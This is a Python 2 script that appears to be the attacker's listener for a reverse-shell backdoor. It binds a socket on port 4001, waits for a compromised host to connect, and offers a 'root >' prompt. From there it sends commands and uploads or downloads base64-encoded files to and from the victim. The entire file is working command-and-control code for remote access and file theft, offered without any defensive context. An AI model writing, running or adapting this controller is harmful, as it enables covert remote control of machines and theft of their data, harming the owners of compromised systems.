import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        print "[+] waiting for connection!"
        sock.bind((ip,port))
        sock.listen(0)
        self.connection,address = sock.accept()
        print "[+] connected to ",address

    def remote_execute(self,command):
        self.connection.send(command)
        return self.recived_data()

    def send_data(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def recived_data(self):
        data = ""
        while True:
            try:
                data = data+ self.connection.recv(1024)
                return json.loads(data)
            except ValueError:
                continue
    
    def read_file(self,filename):
        with open(filename,"rb") as f:
            return  base64.b64encode(f.read())

    def write_file(self,filepath,content):
            with open(filepath,"wb") as file:
                try:
                    file.write(base64.b64decode(content))
                    return "[+] download complete!!"
                except:
                    return "[-] error downloading- writing file!!"
    def run(self):
        while True:
            inp = raw_input("root >")
            inp = inp.split(" ")
            if "upload" in inp:
                reusl = self.read_file(inp[1])
                inp.append(reusl)
            
            self.send_data(inp)
            result = self.recived_data()   
            if "download" in inp:
                self.write_file(inp[1],result)
                print ['[+] download complete']
            
            
            print result
                
    def close(self):
        self.connection.close()
        exit()


server  = Listener("127.0.0.1",4001)
server.run()